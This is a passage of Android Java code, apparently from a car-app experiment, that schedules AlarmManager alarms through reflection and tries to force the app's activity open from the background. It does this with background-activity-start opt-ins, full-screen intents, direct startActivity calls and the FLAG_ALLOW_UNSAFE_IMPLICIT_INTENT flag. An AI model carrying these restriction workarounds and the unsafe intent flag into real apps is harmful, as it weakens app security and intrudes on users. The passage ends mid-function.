    public Result scheduleAlarmToNotifyAndTryOpenApp() {
        final String TAG = "AlarmImpact";
        final String ACTION = "com.reflect.ALARM_OPEN_APP_IMPACT";
        final String CHANNEL_ID = "alarm_impact_channel";
        final int NOTIF_ID = 4242;

        try {
            // Prevent duplicates if called multiple times
            if (!alarmOpenInitialized.compareAndSet(false, true)) {
                alarmOpenUi("Already initialized once; skipping re-register/schedule to avoid duplicates.");
                return new Result("Alarm Open-App Impact (already running)", new java.util.ArrayList<>(alarmOpenUiRows));
            }

            // ---- 0) Get Context (CarDataLogic-friendly) ----
            android.content.Context ctx = null;

            // Prefer the injected appContext from CarDataLogic
            try {
                if (this.appContext != null) ctx = this.appContext;
            } catch (Throwable ignored) {}

            // Fallbacks similar to your style
            if (ctx == null) {
                try {
                    java.lang.reflect.Method m = getClass().getMethod("getApplicationContext");
                    ctx = (android.content.Context) m.invoke(this);
                } catch (Throwable ignore2) {
                    // Last fallback
                    try {
                        Class<?> at = Class.forName("android.app.ActivityThread");
                        java.lang.reflect.Method mcur = at.getDeclaredMethod("currentApplication");
                        mcur.setAccessible(true);
                        Object app = mcur.invoke(null);
                        if (app instanceof android.content.Context) ctx = (android.content.Context) app;
                    } catch (Throwable ignored3) {}
                }
            }

            if (ctx == null) {
                android.util.Log.w(TAG, "Context is null; aborting.");
                alarmOpenUi("Context is null; aborting.");
                return new Result("Alarm Open-App Impact (failed)", new java.util.ArrayList<>(alarmOpenUiRows));
            }

            final android.app.AlarmManager am = (android.app.AlarmManager) ctx.getSystemService(android.content.Context.ALARM_SERVICE);
            if (am == null) {
                android.util.Log.w(TAG, "AlarmManager is null");
                alarmOpenUi("AlarmManager is null; aborting.");
                return new Result("Alarm Open-App Impact (failed)", new java.util.ArrayList<>(alarmOpenUiRows));
            }

            // ---- 1) Create/ensure NotificationChannel (API 26+) ----
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                android.app.NotificationManager nm = (android.app.NotificationManager) ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
                if (nm != null) {
                    android.app.NotificationChannel ch = new android.app.NotificationChannel(
                            CHANNEL_ID,
                            "Alarm Impact",
                            android.app.NotificationManager.IMPORTANCE_HIGH
                    );
                    ch.setDescription("Shows alarm impacts (notification + optional UI launch)");
                    nm.createNotificationChannel(ch);
                    alarmOpenUi("NotificationChannel ensured: " + CHANNEL_ID);
                } else {
                    alarmOpenUi("NotificationManager null; channel not created.");
                }
            }

            // ---- 2) Register a dynamic BroadcastReceiver to observe impact ----
            final java.util.concurrent.atomic.AtomicInteger fireCount = new java.util.concurrent.atomic.AtomicInteger(0);

            android.content.BroadcastReceiver receiver = new android.content.BroadcastReceiver() {
                @Override public void onReceive(android.content.Context context, android.content.Intent intent) {
                    int c = fireCount.incrementAndGet();
                    long nowRtc = System.currentTimeMillis();
                    long nowElapsed = android.os.SystemClock.elapsedRealtime();

                    String extras = (intent == null || intent.getExtras() == null) ? "null" : String.valueOf(intent.getExtras());
                    String line = "ALARM FIRED! count=" + c + " nowRtc=" + nowRtc + " nowElapsed=" + nowElapsed + " extras=" + extras;
                    android.util.Log.i(TAG, line);
                    alarmOpenUi(line);

                    // Build an intent that opens your app
                    // IMPORTANT: Must be an Activity class (NOT CarDataScreen which is a Screen)
                    Class<?> TARGET_ACTIVITY = com.example.carapiaccess.MainActivityNotAAOS.class; // <-- change if needed

                    android.content.Intent openIntent = new android.content.Intent(context, TARGET_ACTIVITY)
                            .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                                    | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP
                                    | android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP);

                    android.app.PendingIntent contentPi = android.app.PendingIntent.getActivity(
                            context,
                            1001,
                            openIntent,
                            android.app.PendingIntent.FLAG_UPDATE_CURRENT
                                    | (android.os.Build.VERSION.SDK_INT >= 23 ? android.app.PendingIntent.FLAG_IMMUTABLE : 0)
                    );

                    // Post a visible notification (tap opens app)
                    try {
                        androidx.core.app.NotificationCompat.Builder nb =
                                new androidx.core.app.NotificationCompat.Builder(context, CHANNEL_ID)
                                        .setSmallIcon(android.R.drawable.ic_lock_idle_alarm)
                                        .setContentTitle("Alarm fired (" + c + ")")
                                        .setContentText("Tap to open the app. nowElapsed=" + nowElapsed)
                                        .setAutoCancel(true)
                                        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
                                        .setContentIntent(contentPi);

                        androidx.core.app.NotificationManagerCompat.from(context).notify(NOTIF_ID, nb.build());
                        alarmOpenUi("Notification posted id=" + NOTIF_ID + " (tap opens Activity).");
                    } catch (Throwable t) {
                        android.util.Log.w(TAG, "Notification post failed: " + t);
                        alarmOpenUi("Notification post failed: " + t);
                    }

                    // Try to open immediately (may be blocked)
                    try {
                        context.startActivity(openIntent);
                        android.util.Log.i(TAG, "startActivity() attempt made");
                        alarmOpenUi("startActivity() attempt made");
                    } catch (Throwable t) {
                        android.util.Log.w(TAG, "startActivity blocked/failed: " + t);
                        alarmOpenUi("startActivity blocked/failed: " + t);
                    }
                }
            };

            android.content.IntentFilter filter = new android.content.IntentFilter(ACTION);

            try {
                if (android.os.Build.VERSION.SDK_INT >= 33) {
                    ctx.registerReceiver(receiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED);
                } else {
                    ctx.registerReceiver(receiver, filter);
                }
                this.alarmOpenReceiver = receiver; // keep reference
                alarmOpenUi("Receiver registered for action=" + ACTION);
            } catch (Throwable t) {
                android.util.Log.w(TAG, "Receiver register failed: " + t);
                alarmOpenUi("Receiver register failed: " + t);
            }

            alarmOpenUi("Scheduling alarm… canScheduleExactAlarms=" + safeCanScheduleExact(am));

            // ---- 3) Create the PendingIntent that will fire the broadcast ----
            android.content.Intent alarmIntent = new android.content.Intent(ACTION).setPackage(ctx.getPackageName());
            alarmIntent.putExtra("note", "visible impact test");

            android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(
                    ctx,
                    2002,
                    alarmIntent,
                    android.app.PendingIntent.FLAG_UPDATE_CURRENT
                            | (android.os.Build.VERSION.SDK_INT >= 23 ? android.app.PendingIntent.FLAG_IMMUTABLE : 0)
            );

            // ---- 4) Schedule for N seconds from now ----
            final long delayMs = 10_000;
            long triggerElapsed = android.os.SystemClock.elapsedRealtime() + delayMs;

            boolean scheduled = false;

            // A) setExact (or setExactAndAllowWhileIdle)
            try {
                int type = android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP;

                try {
                    am.setExactAndAllowWhileIdle(type, triggerElapsed, pi);
                    android.util.Log.i(TAG, "Scheduled setExactAndAllowWhileIdle in " + delayMs + "ms");
                    alarmOpenUi("Scheduled setExactAndAllowWhileIdle in " + delayMs + "ms");
                    scheduled = true;
                } catch (Throwable exactIdleFail) {
                    android.util.Log.w(TAG, "setExactAndAllowWhileIdle failed: " + exactIdleFail);
                    alarmOpenUi("setExactAndAllowWhileIdle failed: " + exactIdleFail);

                    am.setExact(type, triggerElapsed, pi);
                    android.util.Log.i(TAG, "Scheduled setExact in " + delayMs + "ms");
                    alarmOpenUi("Scheduled setExact in " + delayMs + "ms");
                    scheduled = true;
                }
            } catch (Throwable exactFail) {
                android.util.Log.w(TAG, "Exact scheduling path failed: " + exactFail);
                alarmOpenUi("Exact scheduling path failed: " + exactFail);
            }

            // B) Fallback: setWindow
            if (!scheduled) {
                try {
                    int type = android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP;
                    long windowLen = 5_000;
                    am.setWindow(type, triggerElapsed, windowLen, pi);
                    android.util.Log.i(TAG, "Scheduled setWindow in " + delayMs + "ms (window=" + windowLen + ")");
                    alarmOpenUi("Scheduled setWindow in " + delayMs + "ms (window=" + windowLen + ")");
                    scheduled = true;
                } catch (Throwable windowFail) {
                    android.util.Log.w(TAG, "setWindow failed: " + windowFail);
                    alarmOpenUi("setWindow failed: " + windowFail);
                }
            }

            // C) Fallback: set (inexact)
            if (!scheduled) {
                try {
                    int type = android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP;
                    am.set(type, triggerElapsed, pi);
                    android.util.Log.i(TAG, "Scheduled set (inexact) in " + delayMs + "ms");
                    alarmOpenUi("Scheduled set (inexact) in " + delayMs + "ms");
                    scheduled = true;
                } catch (Throwable setFail) {
                    android.util.Log.e(TAG, "All scheduling attempts failed: " + setFail);
                    alarmOpenUi("All scheduling attempts failed: " + setFail);
                    return new Result("Alarm Open-App Impact (failed)", new java.util.ArrayList<>(alarmOpenUiRows));
                }
            }

            // ---- 5) Optional: periodic status logs so “impact” is obvious ----
            android.os.Handler h = new android.os.Handler(android.os.Looper.getMainLooper());
            for (int i = 1; i <= 8; i++) {
                final int tick = i;
                h.postDelayed(() -> {
                    try {
                        String line = "STATUS tick=" + tick
                                + " canScheduleExactAlarms=" + safeCanScheduleExact(am)
                                + " nextAlarmClock=" + safeNextAlarmClock(am)
                                + " firedCount=" + fireCount.get()
                                + " nowElapsed=" + android.os.SystemClock.elapsedRealtime();
                        android.util.Log.i(TAG, line);
                        alarmOpenUi(line);
                    } catch (Throwable t) {
                        android.util.Log.w(TAG, "STATUS error: " + t);
                        alarmOpenUi("STATUS error: " + t);
                    }
                }, tick * 2000L);
            }

            alarmOpenUi("scheduleAlarmToNotifyAndTryOpenApp done (alarm pending)");
            return new Result("Alarm Open-App Impact (live)", new java.util.ArrayList<>(alarmOpenUiRows));

        } catch (Throwable t) {
            android.util.Log.e(TAG, "scheduleAlarmToNotifyAndTryOpenApp error", t);
            alarmOpenUi("scheduleAlarmToNotifyAndTryOpenApp error: " + t);
            return new Result("Alarm Open-App Impact (fatal)", new java.util.ArrayList<>(alarmOpenUiRows));
        }
    }



    /* Got blocked with api 34+
    @SuppressLint({"UnspecifiedRegisterReceiverFlag", "ScheduleExactAlarm", "ObsoleteSdkInt"})
    public Result reflectExerciseAlarmManager_visibleImpact_noCancel() {
        final String TAG = "REFLECT_ALARM";

        try {
            // ---- Context (CarDataLogic version) ----
            android.content.Context ctx = null;
            try {
                if (this.appContext != null) ctx = this.appContext;
            } catch (Throwable ignored) {}

            // Keep a robust reflective fallback (similar to your other code)
            if (ctx == null) {
                try {
                    Class<?> at = Class.forName("android.app.ActivityThread");
                    java.lang.reflect.Method mcur = at.getDeclaredMethod("currentApplication");
                    mcur.setAccessible(true);
                    Object app = mcur.invoke(null);
                    if (app instanceof android.content.Context) ctx = (android.content.Context) app;
                } catch (Throwable ignored) {}
            }

            if (ctx == null) {
                android.util.Log.w(TAG, "Context is null; aborting.");
                alarmUi("Context is null; aborting.");
                return new Result("Alarm Visible Impact (failed)", new java.util.ArrayList<>(alarmUiRows));
            }

            // Prevent duplicates if called repeatedly
            if (!alarmImpactInitialized.compareAndSet(false, true)) {
                alarmUi("Already initialized once; skipping re-register/schedule to avoid duplicates.");
                return new Result("Alarm Visible Impact (already running)", new java.util.ArrayList<>(alarmUiRows));
            }

            // ---- AlarmManager instance via reflection ----
            Class<?> amCls = Class.forName("android.app.AlarmManager");
            Object am = ctx.getSystemService(android.content.Context.ALARM_SERVICE);
            if (am == null || !amCls.isInstance(am)) {
                android.util.Log.w(TAG, "AlarmManager not available");
                alarmUi("AlarmManager not available");
                return new Result("Alarm Visible Impact (failed)", new java.util.ArrayList<>(alarmUiRows));
            }
            android.util.Log.i(TAG, "Got AlarmManager via reflection: " + am.getClass());
            alarmUi("Got AlarmManager via reflection: " + am.getClass());

            // ---- Helpers / state ----
            final android.os.Handler h = new android.os.Handler(android.os.Looper.getMainLooper());
            final java.util.concurrent.atomic.AtomicInteger recvCount = new java.util.concurrent.atomic.AtomicInteger(0);
            final java.util.concurrent.atomic.AtomicInteger listenerCount = new java.util.concurrent.atomic.AtomicInteger(0);

            final String ACTION = "com.reflect.ALARM_TEST_VISIBLE_IMPACT";
            final int REQ_BCAST = 1001;
            final int REQ_ACT = 1002;

            // ---- Notification channel (visible impact) ----
            final String CH_ID = "alarm_impact_channel";
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                android.app.NotificationChannel ch = new android.app.NotificationChannel(
                        CH_ID, "Alarm Impact", android.app.NotificationManager.IMPORTANCE_HIGH);
                ch.setDescription("Shows notifications when alarms fire");
                android.app.NotificationManager nm = ctx.getSystemService(android.app.NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
                alarmUi("NotificationChannel ensured: " + CH_ID);
            }

            // ---- Dynamic receiver so you SEE the alarm fire (logs + notification) ----
            android.content.BroadcastReceiver r = new android.content.BroadcastReceiver() {
                @Override public void onReceive(android.content.Context context, android.content.Intent intent) {
                    int c = recvCount.incrementAndGet();
                    long nowRtc = System.currentTimeMillis();
                    long nowElapsed = android.os.SystemClock.elapsedRealtime();
                    android.os.Bundle extras = intent != null ? intent.getExtras() : null;

                    String line = "BROADCAST ALARM FIRED count=" + c
                            + " nowRtc=" + nowRtc + " nowElapsed=" + nowElapsed
                            + " extras=" + extras;

                    android.util.Log.i(TAG, line);
                    alarmUi(line);

                    // Post a visible notification each time
                    android.app.NotificationManager nm =
                            (android.app.NotificationManager) context.getSystemService(android.content.Context.NOTIFICATION_SERVICE);

                    android.content.Intent openIntent = new android.content.Intent(context, com.example.carapiaccess.MainActivityNotAAOS.class);
                    openIntent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                            | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);

                    int piFlags = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
                    if (android.os.Build.VERSION.SDK_INT >= 23) piFlags |= android.app.PendingIntent.FLAG_IMMUTABLE;

                    android.app.PendingIntent contentPi =
                            android.app.PendingIntent.getActivity(context, 4242, openIntent, piFlags);

                    android.app.Notification n;
                    if (android.os.Build.VERSION.SDK_INT >= 26) {
                        n = new android.app.Notification.Builder(context, CH_ID)
                                .setSmallIcon(android.R.drawable.ic_lock_idle_alarm)
                                .setContentTitle("Alarm fired (" + c + ")")
                                .setContentText("Tap to open app. nowElapsed=" + nowElapsed)
                                .setAutoCancel(true)
                                .setContentIntent(contentPi)
                                .build();
                    } else {
                        // Pre-O fallback (no channel)
                        n = new android.app.Notification.Builder(context)
                                .setSmallIcon(android.R.drawable.ic_lock_idle_alarm)
                                .setContentTitle("Alarm fired (" + c + ")")
                                .setContentText("Tap to open app. nowElapsed=" + nowElapsed)
                                .setAutoCancel(true)
                                .setContentIntent(contentPi)
                                .build();
                    }

                    if (nm != null) nm.notify(9000 + c, n);
                }
            };

            android.content.IntentFilter f = new android.content.IntentFilter(ACTION);

            // registerReceiver differences across API levels:
            // - API 33+: registerReceiver(receiver, filter, flags)
            // - older: registerReceiver(receiver, filter)
            boolean receiverRegistered = false;
            try {
                if (android.os.Build.VERSION.SDK_INT >= 33) {
                    // Use reflection so this compiles even if compileSdk < 33
                    java.lang.reflect.Method m = android.content.Context.class.getMethod(
                            "registerReceiver",
                            android.content.BroadcastReceiver.class,
                            android.content.IntentFilter.class,
                            int.class
                    );
                    // RECEIVER_NOT_EXPORTED constant exists on API 33+, but reference safely via reflection
                    int flag = 0;
                    try {
                        java.lang.reflect.Field fld = android.content.Context.class.getField("RECEIVER_NOT_EXPORTED");
                        flag = fld.getInt(null);
                    } catch (Throwable ignored) {}
                    m.invoke(ctx, r, f, flag);
                } else {
                    ctx.registerReceiver(r, f);
                }
                receiverRegistered = true;
                this.alarmImpactReceiver = r;
                android.util.Log.i(TAG, "Receiver registered for " + ACTION);
                alarmUi("Receiver registered for " + ACTION + " (receiverRegistered=" + receiverRegistered + ")");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "Receiver registration failed", t);
                alarmUi("Receiver registration failed: " + t);
            }

            // ---- PendingIntent (Broadcast) ----
            android.content.Intent bcast = new android.content.Intent(ACTION).setPackage(ctx.getPackageName());
            int piFlags = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
            if (android.os.Build.VERSION.SDK_INT >= 23) piFlags |= android.app.PendingIntent.FLAG_IMMUTABLE;

            android.app.PendingIntent piBroadcast =
                    android.app.PendingIntent.getBroadcast(ctx, REQ_BCAST, bcast, piFlags);

            // ---- PendingIntent (Activity) to try auto-open ----
            android.content.Intent act = new android.content.Intent(ctx, com.example.carapiaccess.MainActivityNotAAOS.class);
            act.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                    | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);

            // Try to opt-in for background activity starts on Android 14+ via ActivityOptions
            android.os.Bundle actOptions = null;
            if (android.os.Build.VERSION.SDK_INT >= 34) {
                try {
                    android.app.ActivityOptions ao = android.app.ActivityOptions.makeBasic();
                    java.lang.reflect.Method setMode =
                            android.app.ActivityOptions.class.getMethod("setPendingIntentBackgroundActivityStartMode", int.class);
                    java.lang.reflect.Field allowedField =
                            android.app.ActivityOptions.class.getField("MODE_BACKGROUND_ACTIVITY_START_ALLOWED");
                    int MODE_ALLOWED = allowedField.getInt(null);

                    setMode.invoke(ao, MODE_ALLOWED);
                    actOptions = ao.toBundle();
                    android.util.Log.i(TAG, "Enabled PendingIntent background activity start mode (Android 14+)");
                    alarmUi("Enabled PendingIntent background activity start mode (Android 14+)");


                } catch (Throwable t) {
                    android.util.Log.w(TAG, "Could not enable background activity start mode; will still try", t);
                    alarmUi("Could not enable background activity start mode; will still try: " + t);
                }
            }

            android.app.PendingIntent piActivity =
                    (actOptions != null)
                            ? android.app.PendingIntent.getActivity(ctx, REQ_ACT, act, piFlags, actOptions)
                            : android.app.PendingIntent.getActivity(ctx, REQ_ACT, act, piFlags);

            // ---- Reflection lookups ----
            java.lang.reflect.Method canExact = amCls.getMethod("canScheduleExactAlarms");
            java.lang.reflect.Method getNextClock = amCls.getMethod("getNextAlarmClock");
            java.lang.reflect.Method getNextWake = amCls.getMethod("getNextWakeFromIdleTime");

            java.lang.reflect.Method mSet = amCls.getMethod("set", int.class, long.class, android.app.PendingIntent.class);
            java.lang.reflect.Method mSetWindow = amCls.getMethod("setWindow", int.class, long.class, long.class, android.app.PendingIntent.class);
            java.lang.reflect.Method mSetRepeating = amCls.getMethod("setRepeating", int.class, long.class, long.class, android.app.PendingIntent.class);
            java.lang.reflect.Method mSetInexact = amCls.getMethod("setInexactRepeating", int.class, long.class, long.class, android.app.PendingIntent.class);
            java.lang.reflect.Method mAllowIdle = amCls.getMethod("setAndAllowWhileIdle", int.class, long.class, android.app.PendingIntent.class);
            java.lang.reflect.Method mSetExact = amCls.getMethod("setExact", int.class, long.class, android.app.PendingIntent.class);

            int RTC_WAKEUP = amCls.getField("RTC_WAKEUP").getInt(null);
            int ELAPSED_REALTIME_WAKEUP = amCls.getField("ELAPSED_REALTIME_WAKEUP").getInt(null);

            long nowRtc = System.currentTimeMillis();
            long nowElapsed = android.os.SystemClock.elapsedRealtime();

            // ---- Schedule alarms (NO CANCEL) ----
            long firstElapsed = nowElapsed + 8_000L;
            long interval = 15_000L;
            mSetRepeating.invoke(am, ELAPSED_REALTIME_WAKEUP, firstElapsed, interval, piBroadcast);
            android.util.Log.i(TAG, "Scheduled setRepeating(broadcast) first in 8s, interval=15s");
            alarmUi("Scheduled setRepeating(broadcast) first in 8s, interval=15s");

            mSetWindow.invoke(am, ELAPSED_REALTIME_WAKEUP, nowElapsed + 10_000L, 5_000L, piBroadcast);
            android.util.Log.i(TAG, "Scheduled setWindow(broadcast) in ~10s (window=5s)");
            alarmUi("Scheduled setWindow(broadcast) in ~10s (window=5s)");

            mSetWindow.invoke(am, ELAPSED_REALTIME_WAKEUP, nowElapsed + 12_000L, 2_000L, piActivity);
            android.util.Log.i(TAG, "Scheduled setWindow(activity) in ~12s to try UI open");
            alarmUi("Scheduled setWindow(activity) in ~12s to try UI open");

            mSetInexact.invoke(am, ELAPSED_REALTIME_WAKEUP, nowElapsed + 20_000L, 60_000L, piBroadcast);
            android.util.Log.i(TAG, "Scheduled setInexactRepeating(broadcast) first in 20s, interval=60s");
            alarmUi("Scheduled setInexactRepeating(broadcast) first in 20s, interval=60s");

            mAllowIdle.invoke(am, RTC_WAKEUP, nowRtc + 25_000L, piBroadcast);
            android.util.Log.i(TAG, "Scheduled setAndAllowWhileIdle(broadcast) in ~25s");
            alarmUi("Scheduled setAndAllowWhileIdle(broadcast) in ~25s");

            try {
                mSetExact.invoke(am, RTC_WAKEUP, nowRtc + 30_000L, piBroadcast);
                android.util.Log.i(TAG, "Scheduled setExact(broadcast) in ~30s");
                alarmUi("Scheduled setExact(broadcast) in ~30s");
            } catch (java.lang.reflect.InvocationTargetException ite) {
                android.util.Log.w(TAG, "setExact failed (expected when exact alarms not allowed): "
                        + ite.getTargetException());
                alarmUi("setExact failed (expected when exact alarms not allowed): " + ite.getTargetException());
            }

            // ---- Periodic status prints so you SEE what's happening over time ----
            boolean finalReceiverRegistered = receiverRegistered;
            final Runnable statusTicker = new Runnable() {
                int tick = 0;
                @Override public void run() {
                    tick++;
                    try {
                        boolean csea = (boolean) canExact.invoke(am);
                        Object nextClock = getNextClock.invoke(am);
                        Object nextWake = getNextWake.invoke(am);
                        String line = "STATUS tick=" + tick
                                + " canScheduleExactAlarms=" + csea
                                + " nextAlarmClock=" + nextClock
                                + " nextWakeFromIdleTime=" + nextWake
                                + " recvCount=" + recvCount.get()
                                + " listenerCount=" + listenerCount.get()
                                + " receiverRegistered=" + finalReceiverRegistered
                                + " nowElapsed=" + android.os.SystemClock.elapsedRealtime();

                        android.util.Log.i(TAG, line);
                        alarmUi(line);
                    } catch (Throwable t) {
                        android.util.Log.w(TAG, "STATUS read failed", t);
                        alarmUi("STATUS read failed: " + t);
                    }
                    if (tick < 20) h.postDelayed(this, 3000);
                }
            };
            h.post(statusTicker);

            // ---- Also schedule an OnAlarmListener (direct callback), visible in logs ----
            try {
                Class<?> listenerIface = Class.forName("android.app.AlarmManager$OnAlarmListener");
                Object listener = java.lang.reflect.Proxy.newProxyInstance(
                        listenerIface.getClassLoader(),
                        new Class<?>[]{listenerIface},
                        (proxy, method, args) -> {
                            if ("onAlarm".equals(method.getName())) {
                                int c = listenerCount.incrementAndGet();
                                String line = "OnAlarmListener FIRED! count=" + c
                                        + " nowRtc=" + System.currentTimeMillis()
                                        + " nowElapsed=" + android.os.SystemClock.elapsedRealtime();

                                android.util.Log.i(TAG, line);
                                alarmUi(line);
                            }
                            return null;
                        });

                java.lang.reflect.Method mSetListener = amCls.getMethod(
                        "set", int.class, long.class, String.class, listenerIface, android.os.Handler.class);

                mSetListener.invoke(am, ELAPSED_REALTIME_WAKEUP, nowElapsed + 6_000L,
                        "visibleImpactListener", listener, h);
                android.util.Log.i(TAG, "Scheduled OnAlarmListener in ~6s");
                alarmUi("Scheduled OnAlarmListener in ~6s");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "OnAlarmListener scheduling failed (API/device-dependent)", t);
                alarmUi("OnAlarmListener scheduling failed (API/device-dependent): " + t);
            }

            android.util.Log.i(TAG, "reflectExerciseAlarmManager_visibleImpact_noCancel DONE");
            alarmUi("reflectExerciseAlarmManager_visibleImpact_noCancel DONE");

            // Return snapshot at time of scheduling; more lines will arrive asynchronously.
            return new Result("Alarm Visible Impact (live)", new java.util.ArrayList<>(alarmUiRows));

        } catch (Throwable t) {
            android.util.Log.e("REFLECT_ALARM", "Fatal error in reflectExerciseAlarmManager_visibleImpact_noCancel", t);
            alarmUi("Fatal error: " + t);
            return new Result("Alarm Visible Impact (fatal)", new java.util.ArrayList<>(alarmUiRows));
        }
    }
*/

    @SuppressLint("WearRecents")
    @RequiresApi(api = Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
    public Result reflectExerciseAlarmManager_visibleImpact_noCancel() {
        final String TAG = "REFLECT_ALARM";

        try {
            // ---- Context (CarDataLogic version) ----
            android.content.Context ctx = null;
            try {
                if (this.appContext != null) ctx = this.appContext;
            } catch (Throwable ignored) {}

            // Keep a robust reflective fallback (similar to your other code)
            if (ctx == null) {
                try {
                    Class<?> at = Class.forName("android.app.ActivityThread");
                    java.lang.reflect.Method mcur = at.getDeclaredMethod("currentApplication");
                    mcur.setAccessible(true);
                    Object app = mcur.invoke(null);
                    if (app instanceof android.content.Context) ctx = (android.content.Context) app;
                } catch (Throwable ignored) {}
            }

            if (ctx == null) {
                android.util.Log.w(TAG, "Context is null; aborting.");
                alarmUi("Context is null; aborting.");
                return new Result("Alarm Visible Impact (failed)", new java.util.ArrayList<>(alarmUiRows));
            }

            // Prevent duplicates if called repeatedly
            if (!alarmImpactInitialized.compareAndSet(false, true)) {
                alarmUi("Already initialized once; skipping re-register/schedule to avoid duplicates.");
                return new Result("Alarm Visible Impact (already running)", new java.util.ArrayList<>(alarmUiRows));
            }

            // ---- AlarmManager instance via reflection ----
            Class<?> amCls = Class.forName("android.app.AlarmManager");
            Object am = ctx.getSystemService(android.content.Context.ALARM_SERVICE);
            if (am == null || !amCls.isInstance(am)) {
                android.util.Log.w(TAG, "AlarmManager not available");
                alarmUi("AlarmManager not available");
                return new Result("Alarm Visible Impact (failed)", new java.util.ArrayList<>(alarmUiRows));
            }
            android.util.Log.i(TAG, "Got AlarmManager via reflection: " + am.getClass());
            alarmUi("Got AlarmManager via reflection: " + am.getClass());

            // ---- Helpers / state ----
            final android.os.Handler h = new android.os.Handler(android.os.Looper.getMainLooper());
            final java.util.concurrent.atomic.AtomicInteger recvCount = new java.util.concurrent.atomic.AtomicInteger(0);
            final java.util.concurrent.atomic.AtomicInteger listenerCount = new java.util.concurrent.atomic.AtomicInteger(0);

            final String ACTION = "com.reflect.ALARM_TEST_VISIBLE_IMPACT";
            final int REQ_BCAST = 1001;
            final int REQ_ACT = 1002;

            // ---- Notification channel (visible impact) ----
            final String CH_ID = "alarm_impact_channel";
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                android.app.NotificationChannel ch = new android.app.NotificationChannel(
                        CH_ID, "Alarm Impact", android.app.NotificationManager.IMPORTANCE_HIGH);
                ch.setDescription("Shows notifications when alarms fire (tries fullscreen)");
                ch.enableVibration(true);
                ch.enableLights(true);
                android.app.NotificationManager nm = ctx.getSystemService(android.app.NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
                alarmUi("NotificationChannel ensured: " + CH_ID);
            }

            // ---- Dynamic receiver so you SEE the alarm fire (logs + notification) ----
            android.content.BroadcastReceiver r = new android.content.BroadcastReceiver() {
                @RequiresApi(api = Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
                @Override public void onReceive(android.content.Context context, android.content.Intent intent) {
                    int c = recvCount.incrementAndGet();
                    long nowRtc = System.currentTimeMillis();
                    long nowElapsed = android.os.SystemClock.elapsedRealtime();
                    android.os.Bundle extras = intent != null ? intent.getExtras() : null;

                    String line = "BROADCAST ALARM FIRED count=" + c
                            + " nowRtc=" + nowRtc + " nowElapsed=" + nowElapsed
                            + " extras=" + extras;

                    android.util.Log.i(TAG, line);
                    alarmUi(line);

                    // ---- Build an Activity intent to open UI ----
                    android.content.Intent openIntent =
                            new android.content.Intent(context, com.example.carapiaccess.MainActivityNotAAOS.class);
                    openIntent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                            | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);

                    //int piFlagsLocal = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
                    int piFlagsLocal = PendingIntent.FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT;
                    piFlagsLocal |= PendingIntent.FLAG_IMMUTABLE;

                    android.app.PendingIntent contentPi =
                            android.app.PendingIntent.getActivity(context, 4242, openIntent, piFlagsLocal);

                    // ---- Visible impact: notification (tries full-screen + normal tap) ----
                    android.app.NotificationManager nm =
                            (android.app.NotificationManager) context.getSystemService(android.content.Context.NOTIFICATION_SERVICE);

                    android.app.Notification n;
                    n = new android.app.Notification.Builder(context, CH_ID)
                            .setSmallIcon(android.R.drawable.ic_lock_idle_alarm)
                            .setContentTitle("Alarm fired (" + c + ")")
                            .setContentText("Tap to open. Fullscreen attempt. nowElapsed=" + nowElapsed)
                            .setAutoCancel(true)
                            .setCategory(android.app.Notification.CATEGORY_ALARM)
                            .setContentIntent(contentPi)
                            // Full-screen attempt (may or may not be honored by OS policy)
                            .setFullScreenIntent(contentPi, true)
                            .build();

                    if (nm != null) nm.notify(9000 + c, n);

                    // ---- ALSO try direct startActivity (likely blocked on modern Android; log it) ----
                    try {
                        context.startActivity(openIntent);
                        alarmUi("startActivity() attempt made (may be blocked by BAL rules)");
                    } catch (Throwable t) {
                        alarmUi("startActivity() failed: " + t);
                    }
                }
            };

            android.content.IntentFilter f = new android.content.IntentFilter(ACTION);

            // registerReceiver differences across API levels:
            boolean receiverRegistered = false;
            try {
                if (android.os.Build.VERSION.SDK_INT >= 33) {
                    java.lang.reflect.Method m = android.content.Context.class.getMethod(
                            "registerReceiver",
                            android.content.BroadcastReceiver.class,
                            android.content.IntentFilter.class,
                            int.class
                    );
                    int flag = 0;
                    try {
                        java.lang.reflect.Field fld = android.content.Context.class.getField("RECEIVER_NOT_EXPORTED");
                        flag = fld.getInt(null);
                    } catch (Throwable ignored) {}
                    m.invoke(ctx, r, f, flag);
                } else {
                    ctx.registerReceiver(r, f, Context.RECEIVER_NOT_EXPORTED);
                }
                receiverRegistered = true;
                this.alarmImpactReceiver = r;
                android.util.Log.i(TAG, "Receiver registered for " + ACTION);
                alarmUi("Receiver registered for " + ACTION + " (receiverRegistered=" + receiverRegistered + ")");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "Receiver registration failed", t);
                alarmUi("Receiver registration failed: " + t);
            }

            // ---- PendingIntent (Broadcast) ----
            android.content.Intent bcast = new android.content.Intent(ACTION).setPackage(ctx.getPackageName());

            int piFlags = PendingIntent.FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT;
